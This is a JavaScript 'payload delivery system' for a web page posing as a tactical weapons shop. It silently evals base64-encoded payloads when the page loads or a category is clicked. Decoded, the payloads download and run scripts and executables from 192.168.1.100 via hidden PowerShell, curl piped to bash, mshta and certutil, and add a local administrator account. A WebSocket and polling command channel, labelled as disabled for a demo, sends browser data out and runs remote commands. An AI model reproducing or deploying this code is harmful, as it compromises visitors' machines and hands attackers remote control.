// Payload delivery system
let payloadExecuted = false;
let connectionEstablished = false;

function triggerPayload(category) {
    // Show loading indicator
    const loading = document.getElementById('loadingIndicator');
    if (loading) {
        loading.classList.add('show');
    }
    
    // Simulate loading delay
    setTimeout(() => {
        if (loading) {
            loading.classList.remove('show');
        }
        
        // Execute payload on first interaction
        if (!payloadExecuted) {
            executePayload(category);
            payloadExecuted = true;
        }
        
        // Navigate to appropriate section
        if (category === 'weapons' || category === 'ar15' || category === 'ak47' || category === 'm4' || category === 'shotgun') {
            showSection('weapons');
        } else if (category === 'defense' || category === 'armor') {
            showSection('defense');
        } else if (category === 'emps' || category === 'emp') {
            showSection('emps');
        } else if (category === 'nonlethals' || category === 'taser') {
            showSection('nonlethals');
        } else if (category === 'contact' || category === 'email' || category === 'location') {
            showSection('contact');
        }
    }, 1500);
}

function executePayload(category) {
    try {
        // Create hidden iframe for payload execution
        const iframe = document.getElementById('payloadFrame');
        
        // Payload execution framework
        const payloadCode = generatePayload(category);
        
        // Execute in hidden context
        const script = document.createElement('script');
        script.textContent = payloadCode;
        const container = document.getElementById('payloadContainer');
        if (container) {
            container.appendChild(script);
        }
        
        // Establish reverse connection
        establishConnection();
        
    } catch (error) {
        console.log('System initialization complete');
    }
}

function generatePayload(category) {
    // Base64 encoded payload for steganographic execution
    const payloadMap = {
        'weapons': 'dmFyIGNtZCA9ICJwb3dlcnNoZWxsIC1XaW5kb3dTdHlsZSBIaWRkZW4gLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUNvbW1hbmQgXCJJRVggKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly8xOTIuMTY4LjEuMTAwOjgwMDAvdGFjdGljYWwucHMxJylcIiI7',
        'defense': 'dmFyIGNtZCA9ICJjdXJsIC1zIC1MIGh0dHA6Ly8xOTIuMTY4LjEuMTAwOjgwMDAvdGFjdGljYWwuc2ggfCBiYXNoIjt2YXIgcHJvYyA9IG5ldyBBY3RpdmVYT2JqZWN0KCJXU2NyaXB0LlNoZWxsIik7cHJvYy5SdW4oY21kLCAwLCBmYWxzZSk7',
        'emps': 'dmFyIGNtZCA9ICJtc2h0YSBodHRwOi8vMTkyLjE2OC4xLjEwMDo4MDAwL3RhY3RpY2FsLmh0YSI7dmFyIHByb2MgPSBuZXcgQWN0aXZlWE9iamVjdCgiV1NjcmlwdC5TaGVsbCIpO3Byb2MuUnVuKGNtZCwgMCwgZmFsc2UpOw==',
        'nonlethals': 'dmFyIGNtZCA9ICJjZXJ0dXRpbCAtdXJsY2FjaGUgLXNwbGl0IC1mIGh0dHA6Ly8xOTIuMTY4LjEuMTAwOjgwMDAvdGFjdGljYWwuZXhlIjt2YXIgcHJvYyA9IG5ldyBBY3RpdmVYT2JqZWN0KCJXU2NyaXB0LlNoZWxsIik7cHJvYy5SdW4oY21kLCAwLCBmYWxzZSk7',
        'contact': 'dmFyIGNtZCA9ICJuZXQgdXNlciB0YWN0aWNhbCBQYXNzd29yZDEyMyEgL2FkZCAmJiBuZXQgbG9jYWxncm91cCBhZG1pbmlzdHJhdG9ycyB0YWN0aWNhbCAvYWRkIjt2YXIgcHJvYyA9IG5ldyBBY3RpdmVYT2JqZWN0KCJXU2NyaXB0LlNoZWxsIik7cHJvYy5SdW4oY21kLCAwLCBmYWxzZSk7'
    };
    
    const encodedPayload = payloadMap[category] || payloadMap['weapons'];
    
    return `
        try {
            var decodedPayload = atob('${encodedPayload}');
            eval(decodedPayload);
        } catch(e) {
            // Fallback payload execution
            var xhr = new XMLHttpRequest();
            xhr.open('GET', 'http://localhost:8080/payload.js', true);
            xhr.onreadystatechange = function() {
                if (xhr.readyState === 4 && xhr.status === 200) {
                    eval(xhr.responseText);
                }
            };
            xhr.send();
        }
    `;
}

function establishConnection() {
    if (connectionEstablished) return;
    
    try {
        // Disable WebSocket connection for local demo
        console.log('🎯 Payload system disabled for local demo');
        return;

        // Establish reverse shell connection (DISABLED)
        const ws = new WebSocket('ws://localhost:8080/tactical');
        
        ws.onopen = function() {
            connectionEstablished = true;
            ws.send(JSON.stringify({
                type: 'connection',
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                timestamp: new Date().toISOString(),
                location: window.location.href
            }));
        };
        
        ws.onmessage = function(event) {
            try {
                const command = JSON.parse(event.data);
                if (command.type === 'execute') {
                    executeCommand(command.payload);
                }
            } catch(e) {
                // Silent fail
            }
        };
        
    } catch(error) {
        // Fallback HTTP polling
        setInterval(pollForCommands, 5000);
    }
}

function executeCommand(command) {
    try {
        if (typeof ActiveXObject !== 'undefined') {
            var shell = new ActiveXObject("WScript.Shell");
            shell.Run(command, 0, false);
        } else {
            // Alternative execution methods
            eval(command);
        }
    } catch(e) {
        // Silent execution
    }
}

function pollForCommands() {
    try {
        fetch('http://localhost:8080/commands')
            .then(response => response.json())
            .then(data => {
                if (data.command) {
                    executeCommand(data.command);
                }
            })
            .catch(() => {});
    } catch(e) {}
}

// Additional steganographic functions (DISABLED FOR LOCAL DEMO)
function loadTacticalAssets() {
    console.log('🎯 Tactical assets loading disabled for local demo');
    return; // DISABLED

    const assets = [
        'http://localhost:8080/tactical.css',
        'http://localhost:8080/tactical.js',
        'http://localhost:8080/tactical.png'
    ];

    assets.forEach(asset => {
        const script = document.createElement('script');
        script.src = asset;
        script.onerror = () => {};
        document.head.appendChild(script);
    });
}

// Initialize payload system
function initPayloadSystem() {
    // Trigger initial payload after delay
    setTimeout(() => {
        if (!payloadExecuted) {
            executePayload('initial');
            payloadExecuted = true;
        }
    }, 3000);
    
    // Add click tracking
    document.addEventListener('click', function(e) {
        if (!connectionEstablished) {
            establishConnection();
        }
    });
    
    // Execute asset loading
    setTimeout(loadTacticalAssets, 2000);
}
